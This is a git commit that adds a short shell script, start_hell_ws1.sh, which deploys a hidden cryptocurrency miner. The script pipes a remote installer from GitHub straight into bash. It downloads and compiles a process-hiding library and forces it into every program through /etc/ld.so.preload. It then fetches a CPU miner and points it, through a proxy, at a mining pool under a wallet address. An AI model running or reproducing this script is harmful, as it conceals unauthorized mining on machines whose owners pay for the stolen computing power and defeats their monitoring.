876d58ac96d935fe216401be66c018d772f5f7bf
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-06-28 20:31:47 +0200

    Create start_hell_ws1.sh

---
+++ start_hell_ws1.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh | bash
+
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicHell.zip
+unzip magicHell.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+wget https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz
+tar -xvzf hellminer_cpu_linux.tar.gz
+graftcp ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RYF4zmgp9dbN2ktHxQMqmzPXtWDhSrQFUL.Hell -p x
